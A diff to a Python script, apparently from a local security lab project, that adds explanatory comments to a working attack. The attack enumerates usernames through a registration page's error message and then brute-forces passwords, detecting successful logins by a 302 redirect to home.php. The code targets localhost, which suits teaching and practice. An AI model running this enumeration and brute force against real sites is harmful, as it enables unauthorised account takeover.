@@ -9,19 +9,22 @@ def run_attack(base_url="http://localhost/CyberProject/login.php", input_file="u
 
     #--- step 1: Enumerating users via the registration page ---
     try:
+        # get the clean page before the enumeration
         clean_page = requests.get(register_url).text
 
+        # read the usernames from the wordlist
         with open(input_file, "r") as file:
             potential_names = list(set(line.strip() for line in file if line.strip()))
         
         print(f"[*] Step 1: Enumerating {len(potential_names)} users...")
+
+        # we know this are the parameters because we can see them in the network requests in the browser
         for name in potential_names:
             payload = {"reg_username": name, "reg_email": f"{name}@test.com", "reg_password": "p", "register_submit": ""}
             response = requests.post(register_url, data=payload)
             
             if enum_error in response.text and enum_error not in clean_page:
-                if name not in found_users:
-                    found_users.append(name)
+                found_users.append(name)
 
         print(f" [!] Found valid usernames: {', '.join(found_users) if found_users else 'None'}")
 
@@ -33,15 +36,12 @@ def run_attack(base_url="http://localhost/CyberProject/login.php", input_file="u
         print(f"\n[*] Step 2: Starting Brute Force on {len(found_users)} users...")
         for user in found_users:
             for pwd in common_passwords:
-                login_payload = {
-                    "username": user,
-                    "password": pwd,
-                    "login_submit": ""
-                }
+                login_payload = {"username": user, "password": pwd, "login_submit": ""}
                 
-                # we are using allow_redirects=False to detect the redirection to home.php
+                # we are using allow_redirects=False to detect the redirection to home.php and not follow it so it will return the 302 status code
                 response = requests.post(base_url, data=login_payload, allow_redirects=False)
                 
+                # 302 redirect to home.php is how the app signals a successful login
                 if response.status_code == 302 and "home.php" in response.headers.get('Location', ''):
                     print(f"  [SUCCESS] Cracked! {user}:{pwd}")
                     cracked_accounts.append((user, pwd))
@@ -59,6 +59,10 @@ def run_attack(base_url="http://localhost/CyberProject/login.php", input_file="u
         return cracked_accounts, found_users
 
     except Exception as e:
+        # Common causes:
+        #   ConnectionError  - XAMPP is not running or the IP/URL is wrong
+        #   FileNotFoundError - usernames.txt was not found at the given path
+        #   MissingSchema    - base_url is malformed (e.g. missing "http://")
         print(f"[!] Error: {e}")
         return [], []
 
